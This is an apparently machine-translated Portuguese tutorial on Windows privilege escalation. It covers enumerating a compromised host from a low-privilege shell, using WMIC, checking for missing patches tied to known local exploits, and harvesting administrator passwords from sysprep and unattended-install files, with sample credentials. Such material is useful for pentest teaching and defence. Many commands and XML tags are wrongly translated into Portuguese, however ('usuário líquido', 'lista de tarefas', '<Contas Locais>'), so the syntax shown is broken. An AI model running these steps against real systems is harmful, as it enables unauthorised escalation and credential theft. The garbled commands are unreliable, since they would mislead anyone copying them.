Fundamentos do escalonamento de privilégios do Windows
Poucas pessoas falam sobre o sério aumento de privilégios do Windows, o que é uma pena. Acho que as razões para isso são provavelmente (1) durante os compromissos de pentesting, um shell de baixo nível de privacidade geralmente é toda a prova que você precisa para o cliente, (2) em ambientes preparados você costuma abrir a conta de administrador, (3) o meterpreter deixa você preguiçoso (getsystem = preguiçoso-fu), (4) criar análises que muitas vezes acabam sendo -> verificação nessus autenticada, analisador de linha de base de segurança da Microsoft ...

Ao contrário da percepção comum, as caixas do Windows podem ser muito bem bloqueadas se forem configuradas com cuidado . Além disso, a janela de oportunidade do patch é pequena. Então, vamos nos aprofundar nos cantos obscuros do sistema operacional Windows e ver se conseguimos obter o SYSTEM.

Deve-se observar que usarei várias versões do Windows para destacar quaisquer diferenças de linha de comando que possam existir. Tenha isso em mente, pois podem existir várias diferenças de SO/SP em termos de comandos que não existem ou que geram resultados ligeiramente diferentes. Tentei estruturar este tutorial para que ele se aplique da maneira mais geral ao escalonamento de privilégios do Windows.

Por fim quero dar um alô ao meu amigo Kostas que também adora pós-exploração, você realmente não quer que ele esteja logado na sua máquina hehe.

Recursos indispensáveis:
Enciclopédia de escalonamento de privilégios do Windows (Brett Moore) - aqui .
Ataques ao Windows: AT é o novo preto (Chris Gates e Rob Fuller) - aqui .
Elevando privilégios explorando permissões de pastas fracas (Parvez Anwar) - aqui .


Δt para t0 a t3 - Coleta de informações iniciais
O ponto de partida para este tutorial é um shell sem privilégios em uma caixa. Poderíamos ter usado uma exploração remota ou um ataque do lado do cliente e recebemos um shell de volta. Basicamente no momento t0 não entendemos a máquina, o que ela faz, a que está conectada, que nível de privilégio temos ou mesmo qual sistema operacional ela é.

Inicialmente queremos reunir rapidamente algumas informações essenciais para que possamos ter uma ideia do terreno e avaliar a nossa situação.

Primeiro, vamos descobrir a qual sistema operacional estamos conectados:

C:\Windows\system32 > informações do sistema | findstr /B /C:"Nome do SO" /C:"Versão do SO"
Nome do SO: Microsoft Windows 7 Profissional
Versão do sistema operacional: 6.1.7601 Service Pack 1 Build 7601

 

A seguir veremos qual é o nome do host da caixa e com qual usuário estamos conectados.

C:\Windows\system32 > nome do host
b33f

C:\Windows\system32 > echo %nomedeusuário% 
usuário1

 

Agora que temos essas informações básicas, listamos as outras contas de usuário na caixa e visualizamos as informações de nossos próprios usuários com mais detalhes. Já podemos ver que o usuário1 não faz parte do grupo local Administradores.

C:\Windows\system32 > usuários da rede

Contas de usuário para \\B33F

-------------------------------------------------- -----------------------------
Administrador b33f Convidado
usuário1
O comando foi concluído com êxito.

C:\Windows\system32 > usuário líquido usuário1

Nome de usuário usuário1
Nome completo
Comente
Comentário do usuário
Código do país 000 (padrão do sistema)
Conta ativa Sim
A conta expira Nunca

Última senha definida em 11/01/2014 19:47:14
A senha expira Nunca
Senha alterável 11/01/2014 19:47:14
Senha obrigatória Sim
O usuário pode alterar a senha Sim

Estações de trabalho permitidas Todas
Script de logon
Perfil de usuário
Diretório inicial
Último login 11/01/2014 20:05:09

Horário de login permitido Todos

Membros de grupos locais *Usuários
Associações ao Grupo Global *Nenhuma
O comando foi concluído com êxito.

 

Isso é tudo que precisamos saber sobre usuários e permissões no momento. O próximo item da nossa lista é a rede, a que a máquina está conectada e quais regras ela impõe a essas conexões.

Primeiro, vamos dar uma olhada nas interfaces de rede disponíveis e na tabela de roteamento.

C:\Windows\system32 > ipconfig /all

Configuração IP do Windows

   Nome de anfitrião . . . . . . . . . . . . : b33f
   Sufixo DNS primário. . . . . . . :
   Tipo de nó. . . . . . . . . . . . : Híbrido
   Roteamento IP ativado. . . . . . . . : Não
   Proxy WINS ativado. . . . . . . . : Não

Adaptador Ethernet Conexão de rede Bluetooth:

   Estado da mídia. . . . . . . . . . . : Mídia desconectada
   Sufixo DNS específico da conexão. :
   Descrição . . . . . . . . . . . : Dispositivo Bluetooth (rede de área pessoal)
   Endereço físico. . . . . . . . . : 0C-84-DC-62-60-29
   DHCP habilitado. . . . . . . . . . . : Sim
   Autoconfiguração habilitada. . . . : Sim
   
Adaptador Ethernet Conexão de área local:

   Sufixo DNS específico da conexão. :
   Descrição . . . . . . . . . . . : Conexão de rede Intel(R) PRO/1000 MT
   Endereço físico. . . . . . . . . : 00-0C-29-56-79-35
   DHCP habilitado. . . . . . . . . . . : Sim
   Autoconfiguração habilitada. . . . : Sim
   Endereço IPv6 local de link . . . . . : fe80::5cd4:9caf:61c0:ba6e%11(preferencial)
   Endereço IPv4. . . . . . . . . . . : 192.168.0.104 (preferencial)
   Máscara de sub-rede. . . . . . . . . . . : 255.255.255.0
   Locação obtida. . . . . . . . . . : Sábado, 11 de janeiro de 2014 15:53:55
   O aluguel expira. . . . . . . . . . : domingo, 12 de janeiro de 2014, 15h53:55
   Gateway padrão. . . . . . . . . : 192.168.0.1
   Servidor DHCP . . . . . . . . . . . : 192.168.0.1
   IAID DHCPv6. . . . . . . . . . . : 234884137
   DUID do cliente DHCPv6. . . . . . . . : 00-01-00-01-18-14-24-1D-00-0C-29-56-79-35
   Servidores DNS. . . . . . . . . . . : 192.168.0.1
   NetBIOS sobre Tcpip. . . . . . . . : Habilitado

C:\Windows\system32 > impressão de rota

================================================= =========================
Lista de interfaces
 18...0c 84 dc 62 60 29 ......Dispositivo Bluetooth (rede de área pessoal)
 13...00 ff 0c 0d 4f ed ......TAP-Adaptador Windows V9
 11...00 0c 29 56 79 35 ......Conexão de rede Intel(R) PRO/1000 MT
  1.........................Interface de Loopback de Software 1
 16...00 00 00 00 00 00 00 e0 Adaptador Microsoft ISATAP
 15...00 00 00 00 00 00 00 e0 Adaptador Microsoft ISATAP nº 2
 19...00 00 00 00 00 00 00 e0 Adaptador Microsoft ISATAP #3
 14...00 00 00 00 00 00 00 e0 Pseudointerface de túnel Teredo
================================================= =========================

Tabela de rotas IPv4
================================================= =========================
Rotas ativas:
Métrica de interface de gateway de máscara de rede de destino de rede
          0.0.0.0 0.0.0.0 192.168.0.1 192.168.0.104 10
        127.0.0.0 255.0.0.0 No link 127.0.0.1 306
        127.0.0.1 255.255.255.255 No link 127.0.0.1 306
  127.255.255.255 255.255.255.255 No link 127.0.0.1 306
      192.168.0.0 255.255.255.0 No link 192.168.0.104 266
    192.168.0.104 255.255.255.255 No link 192.168.0.104 266
    192.168.0.255 255.255.255.255 No link 192.168.0.104 266
        224.0.0.0 240.0.0.0 No link 127.0.0.1 306
        224.0.0.0 240.0.0.0 No link 192.168.0.104 266
  255.255.255.255 255.255.255.255 No link 127.0.0.1 306
  255.255.255.255 255.255.255.255 No link 192.168.0.104 266
================================================= =========================
Rotas persistentes:
  Nenhum

Tabela de rotas IPv6
================================================= =========================
Rotas ativas:
 Se o gateway de destino da rede métrica
 14 58 ::/0 No link
  1 306 ::1/128 No link
 14 58 2001::/32 No link
 14 306 2001:0:5ef5:79fb:8d2:b4e:3f57:ff97/128
                                    No link
 11 266 fe80::/64 No link
 14 306 fe80::/64 No link
 14 306 fe80::8d2:b4e:3f57:ff97/128
                                    No link
 11 266 fe80::5cd4:9caf:61c0:ba6e/128
                                    No link
  1 306 ff00::/8 No link
 14 306 ff00::/8 No link
 11 266 ff00::/8 No link
================================================= =========================
Rotas persistentes:
  Nenhum
  
# arp -A exibe a tabela de cache ARP (Address Resolution Protocol) para todas as interfaces disponíveis.

C:\Windows\system32 > arp -A

Interface: 192.168.0.104 --- 0xb
  Tipo de endereço físico de endereço de Internet
  192.168.0.1 90-94-e4-c5-b0-46 dinâmico
  192.168.0.101 ac-22-0b-af-bb-43 dinâmico
  192.168.0.255 ff-ff-ff-ff-ff-ff estático
  224.0.0.22 01-00-5e-00-00-16 estático
  224.0.0.251 01-00-5e-00-00-fb estático
  224.0.0.252 01-00-5e-00-00-fc estático
  239.255.255.250 01-00-5e-7f-ff-fa estático
  255.255.255.255 ff-ff-ff-ff-ff-ff estático

 

Isso nos leva às conexões de rede ativas e às regras de firewall.

C:\Windows\system32 > netstat -ano

Conexões Ativas

  PID de estado de endereço estrangeiro de endereço proto local
  TCP 0.0.0.0:135 0.0.0.0:0 ESCUTA 684
  TCP 0.0.0.0:445 0.0.0.0:0 ESCUTA 4
  TCP 0.0.0.0:5357 0.0.0.0:0 ESCUTANDO 4
  TCP 127.0.0.1:5354 0.0.0.0:0 ESCUTANDO 1400
  TCP 192.168.0.104:139 0.0.0.0:0 ESCUTANDO 4
  TCP [::]:135 [::]:0 ESCUTA 684
  TCP [::]:445 [::]:0 ESCUTANDO 4
  TCP [::]:5357 [::]:0 ESCUTANDO 4
  UDP0.0.0.0:5355 *:* 1100
  UDP0.0.0.0:52282 *:* 976
  UDP0.0.0.0:55202 *:* 2956
  UDP0.0.0.0:59797 *:* 1400
  UDP 127.0.0.1:1900 *:* 2956
  UDP 127.0.0.1:65435 *:* 2956
  UDP 192.168.0.104:137 *:* 4
  UDP 192.168.0.104:138 *:* 4
  UDP 192.168.0.104:1900 *:* 2956
  UDP 192.168.0.104:5353 *:* 1400
  UDP 192.168.0.104:65434 *:* 2956
  UDP[::]:5355 *:* 1100
  UDP[::]:52281 *:* 976
  UDP[::]:52283 *:* 976
  UDP [::]:55203 *:* 2956
  UDP [::]:59798 *:* 1400
  UDP[::1]:1900 *:* 2956
  UDP[::1]:5353 *:* 1400
  UDP[::1]:65433 *:* 2956
  UDP [fe80::5cd4:9caf:61c0:ba6e%11]:1900 *:* 2956
  UDP [fe80::5cd4:9caf:61c0:ba6e%11]:65432 *:* 2956
  
# Os dois comandos netsh a seguir são exemplos de comandos que não são universais no OS/SP. O netsh
comandos de firewall estão disponíveis apenas no XP SP2 e superior.

C:\Windows\system32 > estado de exibição do firewall netsh

Estado do firewall:
-------------------------------------------------- -----------------
Perfil = Padrão
Modo operacional = Habilitar
Modo de exceção = Habilitar
Modo de resposta multicast/transmissão = Ativar
Modo de notificação = Ativar
Versão da política de grupo = Firewall do Windows
Modo de administração remota = Desativar

Portas atualmente abertas em todas as interfaces de rede:
Programa de versão do protocolo de porta
-------------------------------------------------- -----------------
Nenhuma porta está aberta no momento em todas as interfaces de rede.

C:\Windows\system32 > netsh firewall mostrar configuração

Configuração do perfil de domínio:
-------------------------------------------------- -----------------
Modo operacional = Habilitar
Modo de exceção = Habilitar
Modo de resposta multicast/transmissão = Ativar
Modo de notificação = Ativar

Configuração de programas permitidos para perfil de domínio:
Modo Direção de tráfego Nome/Programa
-------------------------------------------------- -----------------

Configuração de porta para perfil de domínio:
Nome da direção do tráfego do modo de protocolo de porta
-------------------------------------------------- -----------------

Configuração ICMP para perfil de domínio:
Descrição do tipo de modo
-------------------------------------------------- -----------------
Habilitar 2 Permitir pacote de saída muito grande

Configuração de perfil padrão (atual):
-------------------------------------------------- -----------------
Modo operacional = Habilitar
Modo de exceção = Habilitar
Modo de resposta multicast/transmissão = Ativar
Modo de notificação = Ativar

Configuração de serviço para perfil Padrão:
Nome personalizado do modo
-------------------------------------------------- -----------------
Habilitar nenhuma descoberta de rede

Configuração de programas permitidos para perfil Padrão:
Modo Direção de tráfego Nome/Programa
-------------------------------------------------- -----------------
Ativar COMRaider de entrada / E:\comraider\comraider.exe
Ativar entrada nc.exe / C:\users\b33f\desktop\nc.exe

Configuração de porta para perfil Padrão:
Nome da direção do tráfego do modo de protocolo de porta
-------------------------------------------------- -----------------

Configuração ICMP para perfil padrão:
Descrição do tipo de modo
-------------------------------------------------- -----------------
Habilitar 2 Permitir pacote de saída muito grande

Configuração de registro:
-------------------------------------------------- -----------------
Local do arquivo = C:\Windows\system32\LogFiles\Firewall\pfirewall.log
Tamanho máximo do arquivo = 4.096 KB
Pacotes descartados = Desativar
Conexões = Desativar

 

Por fim, daremos uma breve olhada no que está sendo executado na caixa comprometida: tarefas agendadas, processos em execução, serviços iniciados e drivers instalados.

# Isso exibirá resultados detalhados para todas as tarefas agendadas. Abaixo você pode ver um exemplo de saída para um
tarefa única.

C:\Windows\system32 > schtasks /query /fo LIST /v

Pasta:\Microsoft\Windows Defender
Nome do host: B33F
Nome da tarefa: \Microsoft\Windows Defender\Verificação agendada MP
Próxima execução: 22/01/2014 5:11:13
Estado: Pronto
Modo de login: interativo/em segundo plano
Tempo da última execução: N/A
Último resultado: 1
Autor: N/A
Tarefa a ser executada: c:\arquivos de programas\windows defender\MpCmdRun.exe Scan -ScheduleJob
                                      -WinTask -RestrictPrivilegesScan
Início em: N/A
Comentário: Verificação agendada
Estado da tarefa agendada: ativado
Tempo de inatividade: inicie apenas se estiver inativo por 1 minuto, se não estiver inativo, tente novamente por 240 minutos
Gerenciamento de energia: sem inicialização com baterias
Executar como usuário: SYSTEM
Excluir tarefa se não for reprogramada: ativado
Parar tarefa se for executado X horas e X minutos: 72:00:00
Agendamento: os dados de agendamento não estão disponíveis neste formato.
Tipo de horário: Diário
Hora de início: 5h11h13
Data de início: 01/01/2000
Data de término: 01/01/2100
Dias: A cada 1 dia(s)
Meses: N/A
Repetir: Todos: Desativado
Repetir: Até: Hora: Desativado
Repetir: Até: Duração: Desativado
Repita: Pare se ainda estiver em execução: Desativado
[..Recorte..]

# O comando a seguir vincula processos em execução a serviços iniciados.

C:\Windows\system32 > lista de tarefas /SVC

Serviços PID de nome de imagem
======================== ======== ================= ===========================
Processo ocioso do sistema 0 N/A
Sistema 4 N/A
smss.exe 244 N/A
csrss.exe 332 N/A
csrss.exe 372 N/A
wininit.exe 380 N/A
winlogon.exe 428 N/A
serviços.exe 476 N/A
lsass.exe 484 SamSs
lsm.exe 496 N/A
svchost.exe 588 DcomLaunch, PlugPlay, Energia
svchost.exe 668 RpcEptMapper, RpcSs
svchost.exe 760 Audiosrv, Dhcp, log de eventos,
                                   HomeGroupProvider, lmhosts, wscsvc
svchost.exe 800 AudioEndpointBuilder, CscService, Netman,
                                   SysMain, TrkWks, UxSms, WdiSystemHost,
                                   wudfsvc
svchost.exe 836 AeLookupSvc, BITS, gpsvc, iphlpsvc,
                                   LanmanServer, MMCSS, ProfSvc, Agenda,
                                   seclogon, SENS, ShellHWDetection, Temas,
                                   Winmgmt, wuauserv
audiodg.exe 916 N/A
svchost.exe 992 EventSystem, fdPHost, netprofm, nsi,
                                   WdiServiceHost, WinHttpAutoProxySvc
svchost.exe 1104 CryptSvc, Dnscache, LanmanWorkstation,
                                   NlaSvc
spoolsv.exe 1244 Spooler
svchost.exe 1272 BFE, DPS, MpsSvc
mDNSResponder.exe 1400 Serviço Bonjour
taskhost.exe 1504 N/A
taskeng.exe 1556 N/A
vmtoolsd.exe 1580 VMTools
dwm.exe 1660 N/A
explorer.exe 1668 N/A
vmware-usbarbitrator.exe 1768 VMUSBArbService
TPAutoConnSvc.exe 1712 TPAutoConnSvc
[..Recorte..]

C:\Windows\system32 > inicialização líquida

Estes serviços do Windows são iniciados:

   Experiência de aplicação
   Informações do aplicativo
   Serviço de transferência inteligente em segundo plano
   Mecanismo de filtragem de base
   Serviço de suporte Bluetooth
   Bom dia
   Sistema de eventos COM+
   Aplicação do sistema COM+
   Serviços criptográficos
   Iniciador de processos do servidor DCOM
   Gerenciador de sessões do gerenciador de janelas da área de trabalho
   Cliente DHCP
   Serviço de política de diagnóstico
   Host de serviço de diagnóstico
   Host do sistema de diagnóstico
   Cliente de rastreamento de link distribuído
   Coordenador de Transações Distribuídas
   Cliente DNS
   Host do provedor de descoberta de função
   Publicação de recurso de descoberta de função
   Cliente de Política de Grupo
[..Recorte..]
   
# Isso pode ser útil às vezes, pois alguns drivers de terceiros, mesmo de empresas respeitáveis, contêm mais falhas
do que o queijo suíço. Isto só é possível porque a exploração do anel0 está fora da experiência da maioria das pessoas.

C:\Windows\system32 > DRIVERQUERY

Nome do módulo Nome de exibição Tipo de driver Data do link
============ ====================== ============= === ===================
Kernel Ho compatível com 1394ohci 1394 OHCI 20/11/2010 18:01:11
Kernel do driver ACPI Microsoft ACPI 20/11/2010 16:37:52
Kernel da unidade do medidor de energia AcpiPmi ACPI 20/11/2010 16:47:55
adp94xx adp94xx Kernel 06/12/2008 7:59:55
adpahci adpahci Kernel 02/05/2007 1:29:26
adpu320 adpu320 Kernel 28/02/2007 8:03:08
Função auxiliar AFD Dri Kernel 20/11/2010 16:40:00
Kernel de filtro de barramento Intel AGP agp440 14/07/2009 7:25:36
aic78xx aic78xx Kernel 12/04/2006 8:20:11
aliide aliide Kernel 14/07/2009 07:11:17
amdagp AMD AGP Filtro de barramento Dri Kernel 14/07/2009 07:25:36
Amdide Amdide Kernel 14/07/2009 07:11:19
Kernel da unidade do processador AmdK8 AMD K8 14/07/2009 7:11:03
Kernel do driver do processador AMD AmdPPM 14/07/2009 7:11:03
amdsata Kernel amdsata 19/03/2010 9:08:27
amdsbs Kernel amdsbs 21/03/2009 2:35:26
amdxata amdxata Kernel 20/03/2010 12:19:01
Kernel do driver AppID AppID 20/11/2010 17:29:48
arco arco Kernel 25/05/2007 05:31:06
[..Recorte..]

 

Δt para t4 - As Artes Arcanas do WMIC
Quero mencionar o WMIC (Linha de Comando da Instrumentação de Gerenciamento do Windows) separadamente, pois é a ferramenta de linha de comando mais útil do Windows. O WIMIC pode ser muito prático para coleta de informações e pós-exploração. Dito isto, é um pouco desajeitado e o resultado deixa muito a desejar.

Explicar completamente o uso do WMIC exigiria um tutorial próprio. Sem mencionar que parte da saída seria difícil de exibir devido à formatação.

Listei dois recursos abaixo que valem a pena ler sobre o assunto:
Command-Line Ninjitsu (SynJunkie) - aqui
Windows WMIC Command Line (ComputerHope) - aqui

Infelizmente algumas configurações padrão do Windows não permitem acesso ao WMIC a menos que o usuário esteja no grupo Administradores (o que provavelmente é uma boa ideia). Nos meus testes com VMs, notei que qualquer versão do XP não permitia acesso ao WMIC a partir de uma conta com poucos privilégios. Ao contrário, as instalações padrão do Windows 7 Professional e do Windows 8 Enterprise permitiam que usuários com poucos privilégios usassem WMIC e consultassem o sistema operacional sem modificar nenhuma configuração. É exatamente disso que precisamos, pois estamos usando o WMIC para coletar informações sobre a máquina de destino.

Para lhe dar uma ideia sobre as extensas opções que o WMIC possui, listei as opções de linha de comando disponíveis abaixo.

C:\Windows\system32 > wmic /?

[comutadores globais]

As seguintes opções globais estão disponíveis:
/NAMESPACE Caminho para o namespace no qual o alias opera.
/ROLE Caminho para a função que contém as definições de alias.
/NODE Servidores contra os quais o alias irá operar.
/IMPLEVEL Nível de representação do cliente.
/AUTHLEVEL Nível de autenticação do cliente.
/LOCALE ID do idioma que o cliente deve usar.
/PRIVILÉGIOS Ativa ou desativa todos os privilégios.
/TRACE Gera informações de depuração para stderr.
/RECORD Registra todos os comandos de entrada e saída.
/INTERACTIVE Define ou redefine o modo interativo.
/FAILFAST Define ou redefine o modo FailFast.
/USER Usuário a ser utilizado durante a sessão.
/PASSWORD Senha a ser usada para login na sessão.
/OUTPUT Especifica o modo de redirecionamento de saída.
/APPEND Especifica o modo de redirecionamento de saída.
/AGGREGATE Define ou redefine o modo agregado.
/AUTHORITY Especifica opara a conexão.
/?[:<BRIEF|FULL>] Informações de uso.

Para obter mais informações sobre um switch global específico, digite: switch-name /?


Os seguintes alias estão disponíveis na função atual:
ALIAS - Acesso aos aliases disponíveis no sistema local
BASEBOARD - Gerenciamento da placa base (também conhecida como placa-mãe ou placa de sistema).
BIOS - Gerenciamento básico de serviços de entrada/saída (BIOS).
BOOTCONFIG - Gerenciamento de configuração de inicialização.
CDROM - gerenciamento de CD-ROM.
COMPUTERSYSTEM - Gerenciamento de sistemas computacionais.
CPU - gerenciamento de CPU.
CSPRODUCT - Informações sobre produtos de sistemas de computador da SMBIOS.
DATAFILE - Gerenciamento de arquivos de dados.
DCOMAPP - Gerenciamento de aplicativos DCOM.
DESKTOP - Gerenciamento da área de trabalho do usuário.
DESKTOPMONITOR - Gerenciamento de monitores de desktop.
DEVICEMEMORYADDRESS - Gerenciamento de endereços de memória do dispositivo.
DISKDRIVE - Gerenciamento de unidade de disco físico.
DISKQUOTA – Uso de espaço em disco para volumes NTFS.
DMCHANNEL - Gerenciamento de canal de acesso direto à memória (DMA).
AMBIENTE - Gerenciamento das configurações do ambiente do sistema.
FSDIR - Gerenciamento de entrada de diretório do sistema de arquivos.
GRUPO - Gerenciamento de contas de grupo.
IDECONTROLLER - Gerenciamento do controlador IDE.
IRQ - Gerenciamento de linha de solicitação de interrupção (IRQ).
JOB - Fornece acesso aos trabalhos agendados usando o serviço de agendamento.
LOADORDER - Gerenciamento de serviços do sistema que definem dependências de execução.
LOGICALDISK - Gerenciamento de dispositivos de armazenamento local.
LOGON - Sessões LOGON.
MEMCACHE - Gerenciamento de memória cache.
MEMORYCHIP - Informações do chip de memória.
MEMPHYSICAL - Gerenciamento da memória física do sistema computacional.
NETCLIENT - Gerenciamento de clientes de rede.
NETLOGIN - Gerenciamento de informações de login na rede (de um determinado usuário).
NETPROTOCOL - Gerenciamento de protocolos (e suas características de rede).
NETUSE - Gerenciamento ativo de conexões de rede.
NIC - Gerenciamento do controlador de interface de rede (NIC).
NICCONFIG - Gerenciamento de adaptadores de rede.
NTDOMAIN - Gerenciamento de domínio NT.
NTEVENT - Entradas no Log de Eventos do NT.
NTEVENTLOG - gerenciamento de arquivos de log de eventos do NT.
ONBOARDDEVICE - Gerenciamento de dispositivos adaptadores comuns integrados à placa-mãe (placa de sistema).
SO - Gerenciamento de sistemas operacionais instalados.
PAGEFILE - Gerenciamento de troca de arquivos de memória virtual.
PAGEFILESET - Gerenciamento de configurações de arquivo de página.
PARTIÇÃO - Gerenciamento de áreas particionadas de um disco físico.
PORT - Gerenciamento de porta de E/S.
PORTCONNECTOR - Gerenciamento de portas de conexão física.
IMPRESSORA - Gerenciamento de dispositivos de impressora.
PRINTERCONFIG - Gerenciamento de configuração de dispositivos de impressora.
PRINTJOB - Gerenciamento de trabalhos de impressão.
PROCESSO - Gestão de processos.
PRODUTO - Gerenciamento de tarefas do pacote de instalação.
QFE - Engenharia de Correção Rápida.
QUOTASETTING - Configuração de informações para cotas de disco em um volume.
RDACCOUNT - Gerenciamento de permissão de conexão de área de trabalho remota.
RDNIC - Gerenciamento de conexão de Área de Trabalho Remota em um adaptador de rede específico.
RDPERMISSIONS – Permissões para uma conexão específica de Área de Trabalho Remota.
RDTOGGLE - Ativar ou desativar remotamente o ouvinte da Área de Trabalho Remota.
RECOVEROS - Informações que serão coletadas da memória quando o sistema operacional falhar.
REGISTRY - Gerenciamento de registro de sistemas informáticos.
SCSICONTROLLER - Gerenciamento do controlador SCSI.
SERVIDOR - Gerenciamento de informações do servidor.
SERVIÇO - Gerenciamento de aplicativos de serviço.
SHADOWCOPY - Gerenciamento de cópias de sombra.
SHADOWSTORAGE - Gerenciamento da área de armazenamento de cópias de sombra.
COMPARTILHAR - Gerenciamento de recursos compartilhados.
ELEMENTO DE SOFTWARE - Gerenciamento dos elementos de um produto de software instalado em um sistema.
SOFTWAREFEATURE - Gerenciamento de subconjuntos de produtos de software do SoftwareElement.
SOUNDDEV - Gerenciamento de dispositivos de som.
STARTUP - Gerenciamento de comandos que são executados automaticamente quando os usuários fazem login no computador
                           sistema.
SYSACCOUNT - Gerenciamento de contas do sistema.
SYSDRIVER - Gerenciamento do driver do sistema para um serviço base.
SYSTEMENCLOSURE - Gerenciamento de gabinete de sistema físico.
SYSTEMSLOT - Gerenciamento de pontos de conexão física incluindo portas, slots e
                           periféricos e pontos de conexões proprietários.
TAPEDRIVE - Gerenciamento de unidades de fita.
TEMPERATURA - Gerenciamento de dados de um sensor de temperatura (termômetro eletrônico).
TIMEZONE - Gerenciamento de dados de fuso horário.
UPS - Gerenciamento de fonte de alimentação ininterrupta (UPS).
USERACCOUNT - Gerenciamento de conta de usuário.
TENSÃO - Gerenciamento de dados do sensor de tensão (voltímetro eletrônico).
VOLUME - Gerenciamento de volume de armazenamento local.
VOLUMEQUOTASETTING - Associa a configuração de cota de disco a um volume de disco específico.
VOLUMEUSERQUOTA - Gerenciamento de cota de volume de armazenamento por usuário.
WMISET - Gerenciamento de parâmetros operacionais do serviço WMI.

Para obter mais informações sobre um alias específico, digite: alias /?

CLASS - Escape para o esquema WMI completo.
PATH - Escape para caminhos completos de objetos WMI.
CONTEXTO - Exibe o estado de todos os switches globais.
QUIT/EXIT - Sai do programa.

Para obter mais informações sobre CLASS/PATH/CONTEXT, digite: (CLASS | PATH | CONTEXT) /?

 

Para simplificar as coisas, criei um script que pode ser colocado na máquina de destino e que usará WMIC para extrair as seguintes informações: processos, serviços, contas de usuários, grupos de usuários, interfaces de rede, informações do disco rígido, informações de compartilhamento de rede, Windows instalado patches, programas executados na inicialização, lista de softwares instalados, informações sobre o sistema operacional e fuso horário.

Analisei vários sinalizadores e parâmetros para extrair informações valiosas. Se alguém pensar em algo que deveria ser adicionado à lista, deixe um comentário abaixo. Usando os recursos de saída integrados, o script gravará todos os resultados em um arquivo html legível por humanos.

Você pode baixar meu script (wmic_info.bat) - aqui
Exemplo de arquivo de saída em uma VM do Windows 7 (mal corrigida) - aqui

Δt para t5 a t6 - Falhas Rápidas
Antes de continuar, você deve reservar um momento para revisar as informações que reuniu até o momento, pois já deve haver algumas delas. A próxima etapa em nosso plano de jogo é procurar algumas falhas rápidas de segurança que possam ser facilmente aproveitadas para atualizar nossos privilégios de usuário.

A primeira e mais óbvia coisa que precisamos observar é o nível do patch. Não há necessidade de nos preocupar mais se percebermos que o host está mal corrigido. Meu script WMIC já listará todos os patches instalados, mas você pode ver o exemplo de saída da linha de comando abaixo.

C:\Windows\system32 > wmic qfe obtém legenda, descrição, HotFixID, instalado em

Legenda Descrição HotFixID instalado em
http://support.microsoft.com/?kbid=2727528 Atualização de segurança KB2727528 23/11/2013
http://support.microsoft.com/?kbid=2729462 Atualização de segurança KB2729462 26/11/2013
http://support.microsoft.com/?kbid=2736693 Atualização de segurança KB2736693 26/11/2013
http://support.microsoft.com/?kbid=2737084 Atualização de segurança KB2737084 23/11/2013
http://support.microsoft.com/?kbid=2742614 Atualização de segurança KB2742614 23/11/2013
http://support.microsoft.com/?kbid=2742616 Atualização de segurança KB2742616 26/11/2013
http://support.microsoft.com/?kbid=2750149 Atualização KB2750149 23/11/2013
http://support.microsoft.com/?kbid=2756872 Atualização KB2756872 24/11/2013
http://support.microsoft.com/?kbid=2756923 Atualização de segurança KB2756923 26/11/2013
http://support.microsoft.com/?kbid=2757638 Atualização de segurança KB2757638 23/11/2013
http://support.microsoft.com/?kbid=2758246 Atualização KB2758246 24/11/2013
http://support.microsoft.com/?kbid=2761094 Atualização KB2761094 24/11/2013
http://support.microsoft.com/?kbid=2764870 Atualização KB2764870 24/11/2013
http://support.microsoft.com/?kbid=2768703 Atualização KB2768703 23/11/2013
http://support.microsoft.com/?kbid=2769034 Atualização KB2769034 23/11/2013
http://support.microsoft.com/?kbid=2769165 Atualização KB2769165 23/11/2013
http://support.microsoft.com/?kbid=2769166 Atualização KB2769166 26/11/2013
http://support.microsoft.com/?kbid=2770660 Atualização de segurança KB2770660 23/11/2013
http://support.microsoft.com/?kbid=2770917 Atualização KB2770917 24/11/2013
http://support.microsoft.com/?kbid=2771821 Atualização KB2771821 24/11/2013
[..Recorte..]

 

Como sempre acontece com o Windows, a saída não está exatamente pronta para uso. A melhor estratégia é procurar explorações de escalonamento de privilégios e procurar seus respectivos números de patch KB. Tais explorações incluem, mas não estão limitadas a, KiTrap0D (KB979682), MS11-011 (KB2393802), MS10-059 (KB982799), MS10-021 (KB979683), MS11-080 (KB2592799). Depois de enumerar a versão do sistema operacional e o Service Pack, você deverá descobrir quais vulnerabilidades de escalonamento de privilégios podem estar presentes. Usando os números de patch KB, você pode verificar os patches instalados para ver se algum está faltando.

Você pode ver a sintaxe para executar o grep nos patches abaixo:

C:\Windows\system32 > wmic qfe obtém legenda, descrição, HotFixID, instalado em | findstr /C:"KB.." /C:"KB.."

 

A seguir, daremos uma olhada nas implementações em massa. Se houver um ambiente onde muitas máquinas precisam ser instaladas, normalmente um técnico não irá de máquina em máquina. Existem algumas soluções para instalar máquinas automaticamente. O que são esses métodos e como funcionam é menos importante para nossos propósitos, mas o principal é que eles deixam para trás arquivos de configuração que são usados ​​para o processo de instalação. Esses arquivos de configuração contêm muitas informações confidenciais, como a chave do produto do sistema operacional e a senha do administrador. O que mais nos interessa é a senha do administrador, pois podemos usá-la para elevar nossos privilégios.

Normalmente, estes são os diretórios que contêm os arquivos de configuração (no entanto, é uma boa ideia verificar todo o sistema operacional):
c:\sysprep.inf
c:\sysprep\sysprep.xml
%WINDIR%\Panther\Unattend\Unattended.xml
% WINDIR%\Panther\Unattended.xml

Esses arquivos contêm senhas em texto não criptografado ou em formato codificado em Base64. Você pode ver alguns exemplos de saída de arquivo abaixo.

# Este é um exemplo de sysprep.inf com credenciais de texto não criptografado.

[Gui desacompanhado]
OEMSkipRegional=1
OemSkipBem-vindo=1
AdminPassword=s3cr3tp4ssw0rd
Fuso horário=20

# Este é um exemplo de sysprep.xml com credenciais "codificadas" em Base64. Por favor pessoal Base64 não é
criptografia, tomo mais precauções para proteger meu café. A senha aqui é “SuperSecurePassword”.

<Contas locais>
    <Conta Local wcm:action="add">
        <Senha>
            <Valor>U3VwZXJTZWN1cmVQYXNzd29yZA==</Valor>
            <PlainText>falso</PlainText>
        </Senha>
        <Descrição>Administrador local</Descrição>
        <DisplayName>Administrador</DisplayName>
        <Grupo>Administradores</Grupo>
        <Nome>Administrador</Nome>
    </LocalAccount>
</Contas Locais>

# Amostra de Unattended.xml com a mesma codificação Base64 "segura".

<Logon automático>
    <Senha>
        <Valor>U3VwZXJTZWN1cmVQYXNzd29yZA==</Valor>
        <PlainText>falso</PlainText>
    </Senha>
    <Ativado>verdadeiro</Ativado>
    <Nome de usuário>Administrador</Nome de usuário>
</AutoLogon>

 

